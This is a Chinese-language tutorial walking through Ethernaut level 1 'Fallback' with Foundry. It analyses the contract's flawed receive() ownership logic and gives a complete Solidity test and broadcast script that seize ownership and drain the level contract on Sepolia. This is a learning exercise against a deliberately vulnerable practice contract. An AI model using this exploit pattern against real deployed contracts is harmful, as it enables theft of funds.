# Ethernaut 第一关：Fallback


我们今天不等了，直接进入实战，运用前面学习的知识来攻克难关

## 为什么使用 Foundry

我们使用 foundry 来攻克 ethernaut，今天首要的目的是先安装环境。

Foundry 的最大优势是：
1. **速度非常快**：运行测试飞快
2. **Solidity 原生**：可以使用 Solidity 来写攻击脚本，这让你对合约的理解更加通透
3. **强大的主网分叉**：你可以在本地克隆一个 sepolia 的状态，在不花一分钱的情况下无限次的去尝试攻击，直到你成功之后再提交上链

我们为什么要使用主网 fork？直接在上面测试不就好了？
1. 每次测试都要等出块，这大大增加了测试的时间
2. 每次测试不要 gas 吗？
3. fork 模式允许你瞬间完成交易并拥有无限的 ETH，比链上测试爽多了

## 环境配置

首先我们需要配置一个 sepolia 的网络通道。

依旧是使用 sepolia key，我们可以去 Alchemy 或 Infura 申请一个免费的 key，免费的足够用了。

然后需要准备一个钱包的私钥，里面需要放一些 sepolia 的 ETH，千万不要使用有钱在里面的钱包，推荐创建一个新钱包然后往里面转一些 Sepolia ETH，然后把这个钱包导入到网页钱包例如 metamask 钱包中。

### 初始化项目

我们重新初始化一个项目：

```bash
forge init ethernaut-foundry
cd ethernaut-foundry
```

然后在这个项目中创建一个 `.env` 文件来保存我们的 key 和私钥，内容如下：

```bash
SEPOLIA_RPC_URL=https://eth-sepolia.g.alchemy.com/v2/你的API_KEY
PRIVATE_KEY=你的私钥 (0x开头)
```

运行 `source .env` 来让终端加载这些变量。

## 获取关卡

这时候我们需要获取关卡了。

我们打开 ethernaut 的官网：https://ethernaut.openzeppelin.com/

并链接你上面私钥的钱包。

今天我们要进行第一关，所以点击 01 的图标。

![image](https://github.com/user-attachments/assets/28f9a9df-f6dd-48ab-aa0d-804727b45033)

进入网页之后最下方有一个 **deploy contract**，相当于部署一个当前的合约到链上。

![{9638395C-85FD-41C6-B112-23243CCBA8FF}](https://github.com/user-attachments/assets/7bc60e07-9515-4c70-b52b-61152e33fa9b)

## 创建本地合约文件

接下来我们要把创建一个这个合约到本地。

我们在 `src` 文件夹中创建一个 `fallback.sol`

![{6A0FA691-7DCC-4B77-89BE-340CB444C83F}](https://github.com/user-attachments/assets/adf2759a-14a7-4e8f-af35-a15514123eeb)

然后复制 ethernaut 网页上的代码放入其中。

![{82BCB538-AAE9-4074-9370-986A6C4CA924}](https://github.com/user-attachments/assets/2c0713de-b159-47d4-8a22-d8861c299e91)

接下来找到 `test` 文件夹，在其中新建一个测试文件，我这里把它起名为 `fallback.t.sol`

![{CA7D26C0-4F4F-4E44-8F88-6B4F6207E5E9}](https://github.com/user-attachments/assets/1e6e8db3-dc54-4345-abe1-18e1fff81f96)

这个就是我们要在本地写的测试文件。

以上步骤在后面几天我们会重复使用，所以后面就不再赘述了。

## 分析 Fallback 合约

首先我们分析一个这个 Fallback 这关，应该怎么攻破。

我们首先看到这一关的目标：
1. 获得这个合约的所有权
2. 把他的余额减到 0

这两个我们都能理解。

那我们看到代码中有 `owner`：

```solidity
address public owner;
```

这个在 `constructor` 中就定义了，意思是在合约部署的时候就传入了：

```solidity
constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
}
```

看到这好像感觉，我自己部署了这个合约，那 `owner` 不就直接是我自己了吗？

不对的，我们使用网页上的按钮部署的时候，实际上是调用另外的一个合约帮我们部署了这个合约，实际上合约的 `owner` 不是我们，不然这个题也没意义了。

我们继续往下看，`onlyOwner` 修饰符是只允许 `owner` 调用，这个不用多讲。

到了 `contribute` 函数，我们仔细分析一下：

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

首先它要求我们每次贡献的钱的数量不能大于 `0.001 ETH`。

另外在 `if` 函数中，如果我们的贡献比 `owner` 的多，那他就会把 `owner` 设置为发送者。

这里有个大问题，`owner` 的 `contributions` 在 `constructor` 中写了，是 `1000 * (1 ether)` 也就是 1000 ETH，根本没有那么多钱啊。

所以这里我们没办法攻破，继续往下看。

`getContribution` 是显示我们的贡献多少钱的函数。

`withdraw` 是提取当前合约资金的函数，对于攻破都没有任何意义。

接下来我们看到一个函数 `receive`：

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

这个里面讲了，如果发送的钱大于 0 并且贡献值大于 0，那么就把 `owner` 权限给发送者。

**这个正是我们要找的函数！**

`receive` 和 `fallback` 的区别没忘吧：
- `receive` 是一个会计，只管收钱，没有 `calldata` 也就是附属值的时候会调用 `receive`
- `fallback` 是客服，`receive` 处理不了的，有 `calldata` 或者没有 `receive` 函数的时候，它就会出来处理

## 攻击流程

那我们明白了攻破这个合约的流程了：
1. 我们需要使用 `contribute` 函数贡献一些 ETH 进去，但是不能大于 0.001
2. 我们直接转账一些钱到这个合约，触发 `receive` 函数，由于我们有 `contributions` 并且转账值大于 0，合约会把所有权转给我们发送者
3. 调用 `withdraw` 函数，轻松提取所有在这个合约内的资金

## 编写测试文件

搞定，我们开始写 `fallback.t.sol` 里面的内容了。

首先写一下我们用的什么协议，然后用的是哪个版本的 Solidity：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
```

接下来要在本地测试，那我们就要引入 `Test.sol`，当作模板，顺便导入 `console.sol`，作为输出的方法。

再导入我们刚刚保存的 `fallback.sol` 合约，让编译器知道我们攻破的合约内容：

```solidity
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Fallback.sol";
```

接下来写一个测试合约，我把它叫做 `FallbackTest`：

```solidity
contract FallbackTest is Test{

}
```

在这个合约中，我们首先定义一下要攻击的合约，还有攻击者的地址以及 sepolia 的 RPC：

```solidity
Fallback level1;

address payable att = payable(makeAddr("attacker"));

string Sepolia_RPC = vm.envString("SEPOLIA_RPC_URL");
```

再写一个 `setUp` 函数，这个是每次启动测试的时候自动运行的，相当于初始化，我们在上一周测试的时候说过：

```solidity
function setUp() public {
    uint256 fork = vm.createFork(Sepolia_RPC);
    vm.selectFork(fork);

    address payable instanceAddress = payable(0xaddress);

    level1 = Fallback(payable(instanceAddress));

    vm.deal(att, 10 ether);
}
```

`fork` 是创建一个 sepolia 的主网分叉模式，`vm.selectFork(fork);` 选择我们现在的环境是在 fork 这个环境下运行的。

我们把刚刚的网页上部署的合约替换掉 `address payable instanceAddress = payable(0xaddress);` 里面的 `0xaddress`，不需要引号。

如果找不到刚刚的合约，在 ethernaut 的 console 里面输入 `contract` 即可看到合约地址。

我们使用引入的 `Fallback` 合约对象创建一个合约的实例，方便后面测试。

最后往攻击地址增加 10 个 ETH，增加 100 个也行，随便。

接下来我们就要按照上面破解合约的流程写了。

我们先定义一个测试函数叫 `testFallback`：

```solidity
function testFallback() public {

    vm.startPrank(att);

    level1.contribute{value: 0.00001 ether}();
    assertEq(level1.getContribution(), 0.00001 ether);

    payable(level1).call{value: 0.00001 ether}("");
    
    assertEq(level1.owner(), att);

    level1.withdraw();
    assertEq(address(level1).balance, 0);

    vm.stopPrank();
}
```

首先 `vm.startPrank(att);` 把我们运行的地址设置为 `att` 这个地址，我们现在身份就是 `att`。

然后按照攻破流程：
1. 我们需要使用 `contribute` 函数贡献一些 ETH 进去，但是不能大于 0.001：`level1.contribute{value: 0.00001 ether}();` 并且写一个断言来判断是不是真的贡献成功了
2. 我们直接转账一些钱到这个合约，触发 `receive` 函数，由于我们有 `contributions` 并且转账值大于 0，合约会把所有权转给我们发送者：`payable(level1).call{value: 0.00001 ether}("");` 再写一个断言来判断有没有得到管理员权限
3. 调用 `withdraw` 函数，轻松提取所有在这个合约内的资金：`level1.withdraw();` 最后写一个断言，看看合约资金是不是真被我们掏空了 `assertEq(address(level1).balance, 0);`

结束后使用 `vm.stopPrank();` 关闭上下文环境。

### 完整测试代码

完整代码如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test{

    Fallback level1;

    address  payable att = payable(makeAddr("attacker"));

    string Sepolia_RPC = vm.envString("SEPOLIA_RPC_URL");


    function setUp() public {
        uint256 fork = vm.createFork(Sepolia_RPC);
        vm.selectFork(fork);

        address payable instanceAddress = payable(0xAc76a5046fc29e46ee7585dC6eDF0F299EaE7AdA);

        level1 = Fallback(payable(instanceAddress));

        vm.deal(att, 10 ether);

    }

    function testFallback() public {

        vm.startPrank(att);

        level1.contribute{value: 0.00001 ether}();
        assertEq(level1.getContribution(), 0.00001 ether);

        payable(level1).call{value: 0.00001 ether}(""); 

        assertEq(level1.owner(), att);

        level1.withdraw();
        assertEq(address(level1).balance, 0);

        vm.stopPrank();

    }

}
```

## 运行测试

现在我们需要运行一下我们的测试，看看思路正确不正确，是不是能成功攻破合约。

在终端运行下面的命令，如果你的文件名和我一样的化不需要修改，不然要改为自己的文件名：

```bash
forge test --match-path test/fallback.t.sol -vvvv
```

`-vvvv` 是调试非常好用的神器：
- `-v`: 只显示测试通过/失败
- `-vv`: 显示 `console.log` 的内容
- `-vvvv`: 显示所有的执行堆栈 (Traces)。如果你的攻击失败了，你可以看到具体是在哪一行代码 revert (回滚) 的，以及参数是什么

过一会会出现如下图所示，代表我们的测试通过！

![{3C2E8D24-5F3B-444B-972E-3E3C81D6F4C7}](https://github.com/user-attachments/assets/648e4fb9-9f4a-4a19-93ed-20587ffb9aa0)

## 上链部署

这时候我们需要把它上链啊，总不能一直在本地模拟成功，那模拟成功了也没什么用。

这时候我们就用到 script 了。

在 script 目录下新建一个文件 `script.s.sol`

![{2CBAC819-1323-43EE-A684-A5D756E70E71}](https://github.com/user-attachments/assets/bcd4f82f-fd55-49cb-b8d8-0b0125f5bcb5)

我们就使用这个文件让操作上链，代码如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Fallback.sol";

contract FallbackTest is Script{

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        address fallbackAddress = 0xAc76a5046fc29e46ee7585dC6eDF0F299EaE7AdA;
        Fallback fallb = Fallback(payable(fallbackAddress));

        vm.startBroadcast(privateKey);
        
        fallb.contribute{value: 0.00001 ether}();

        (bool success, ) = address(fallb).call{value: 0.0001 ether}("");
        require(success, "Transfer failed");

        fallb.withdraw();

        console.log("completed");

        vm.stopBroadcast();
    }
}
```

看着是不是和 Test 很像？

### 讲一下变化

我们在 test 是引入 `Test.sol`，我们写 script 是引入 `import "forge-std/Script.sol";`

然后我们在创建合约的时候，继承的也是 script：`contract FallbackTest is Script{}`

script 的入口函数叫 `run`，所以我们新定义一个 `function run() external {}`

接下来我们因为要真实上链，所以就不能使用模拟账户了，我们从 env 文件里面读取我们写的 `privateKey`，然后运行 `vm.startBroadcast(privateKey())` 把我们的真实钱包当作我们当前使用的钱包，设置为上下文环境即 context。

继续定义一个 `fallback` 函数。

然后我们按照测试文件中相同的方法来发送：
1. 先贡献：`fallb.contribute{value: 0.00001 ether}();` 由于我们当前使用的是私钥钱包，所以发送者就是我们的私钥钱包
2. 给合约发送一点钱，触发 `receive` 函数：`(bool success, ) = address(fallb).call{value: 0.0001 ether}("");`
3. 提取所有合约里的钱：`fallb.withdraw();`

明白了吧，相当于我们把测试的流程变成真的发送到链上了。

### 执行 Script

然后我们要使用：

```bash
forge script script/fallback.s.sol --rpc-url $SEPOLIA_RPC_URL
```

这个命令。

稍等一会后会出现结果，如果成功的话就和下图一样：

![{3A93E064-B95B-4CE4-848A-ADFA8D645B72}](https://github.com/user-attachments/assets/f4e4b1aa-cd08-47eb-a97d-d418e1cda623)

这时候并不是真的成功了，我们只是在本地模拟运行了一遍，看看有没有报错。

接下来运行：

```bash
forge script script/fallback.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast
```

`--broadcast` 这个是把交易广播到链上。

这个运行之后可能会等待一会，最后出现一堆 hash，去 sepolia 浏览器看看有没有全部成功，如果成功之后你就可以回到 ethernaut 页面点击 **Submit Instance** 了。

之后最上面的解析字就会变化，我们就成功拿下了！

![{231BB684-1DFC-4C3A-9C99-BA5E735DD921}](https://github.com/user-attachments/assets/0b35bf4a-faaf-457f-8683-d10c39dabe3f)
